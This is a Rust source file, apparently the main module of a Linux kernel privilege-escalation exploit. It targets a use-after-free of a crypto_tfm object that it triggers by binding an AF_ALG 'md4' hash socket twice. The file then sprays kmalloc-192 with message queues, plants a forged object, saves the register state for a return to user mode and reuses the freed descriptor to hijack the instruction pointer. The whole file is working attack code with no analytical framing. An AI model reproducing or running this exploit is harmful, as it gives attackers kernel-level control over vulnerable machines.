// RUSTFLAGS='-C target-feature=+crt-static' cargo build --release
// 
// LCFR 2015/2024

#![feature(naked_functions)]
extern crate libc;

mod mqueue;
mod targets;
mod payload;
mod tfm;

use libc::{
    socket, bind, accept4, sockaddr, 
    SOCK_SEQPACKET, PF_ALG, AF_ALG,
    mq_send, mqd_t, sched_setaffinity,
    cpu_set_t, CPU_ZERO, CPU_SET
};
use std::{
    ptr,
    os::unix::io::RawFd,
    mem::MaybeUninit,
};
use crate::mqueue::{
    setup_mqueue, release_slab, consume_slabs, 
    MAX_MSG_SIZE
};
use crate::targets::{lock_on, Target};
use crate::payload::save_state;
use crate::tfm::build_tfm_obj;

#[repr(C)]
struct SockaddrAlg {
    salg_family: u16,
    salg_type: [u8; 14],
    salg_feat: u32,
    salg_mask: u32,
    salg_name: [u8; 64],
}

impl SockaddrAlg {
    fn new() -> Self {
        unsafe {
            let mut sa = SockaddrAlg {
                salg_family: AF_ALG as u16,
                salg_type: MaybeUninit::zeroed().assume_init(),
                salg_feat: 0,
                salg_mask: 0,
                salg_name: MaybeUninit::zeroed().assume_init(),
            };

            sa.salg_type[0..4].copy_from_slice(b"hash");
            sa.salg_name[0..3].copy_from_slice(b"md4");
            sa
        }
    }
}

// lock cpu core
fn lock_in() -> Result<(), String> {
    unsafe {
        let mut mask: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut mask);
        CPU_SET(0, &mut mask);
        if sched_setaffinity(0, std::mem::size_of::<cpu_set_t>(), &mask) < 0 {
            return Err("[-] Failed to set CPU affinity ;(".into());
        }
        println!("[+] Locked in");
    }
    Ok(())
}

// trigger bug
fn pull_trigger() -> Result<RawFd, String> {
    let sa = SockaddrAlg::new();
    println!("[+] Setting up alg socket");

    let bind_fd: RawFd = unsafe { 
        socket(PF_ALG, SOCK_SEQPACKET, 0)
    };

    if bind_fd < 0 {
        return Err("[-] Socket creation failed".into());
    }

    // create crypto_tfm object
    unsafe {
        if bind(
            bind_fd, 
            &sa as *const _ as *const sockaddr, 
            std::mem::size_of::<SockaddrAlg>() as libc::socklen_t
        ) < 0 {
            return Err("[-] Bind failed".into());
        }
    }

    // grab a crypto_tfm reference
    let accept_fd = unsafe { 
        accept4(
            bind_fd, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            0
        ) 
    };

    // free the crypto_tfm
    println!("[+] Triggering free on obj");
    unsafe {
        if bind(
            bind_fd, 
            &sa as *const _ as *const sockaddr, 
            std::mem::size_of::<SockaddrAlg>() as libc::socklen_t
        ) < 0 {
            return Err("[-] Bind failed".into());
        }
    }
    Ok(accept_fd)
}

// trigger RIP control 
fn reuse_freed_fd(fd: RawFd) {
    unsafe {
        accept4(fd, ptr::null_mut(), ptr::null_mut(), libc::SOCK_NONBLOCK);
    }
}

// build & allocate the corrupt object
fn realloc_tfm(mq: mqd_t, target: &Target) -> Result<(), String> {
    println!("[+] Trying to reallocate target object");

    let max_msg_size = MAX_MSG_SIZE.try_into().unwrap();
    let crypto_tfm = build_tfm_obj(target);

    if unsafe { mq_send(mq, crypto_tfm.as_ptr() as *const _, max_msg_size, 0) } < 0 {
        return Err("[-] realloc_tfm mq_send failed".into());
    }

    Ok(())
}

fn main() -> Result<(), String> {
    let target = lock_on()?;
    // lock cpu 
    lock_in()?;
    // setup message queue
    let msg_q = setup_mqueue()?;
    // release previous msgs if any
    release_slab(msg_q)?; 
    // spray kmalloc-192 
    consume_slabs(msg_q)?;
    // triger free on crypto_tfm
    let freed_fd = pull_trigger()?;
    // build & allocate the exploit crypto_tfm object 
    realloc_tfm(msg_q, target)?;
    // save SS, CS, RFLAGS, RSP
    save_state();
    // call crypto_ahash_export to reuse freed crypto_tfm
    reuse_freed_fd(freed_fd);

    Ok(())
}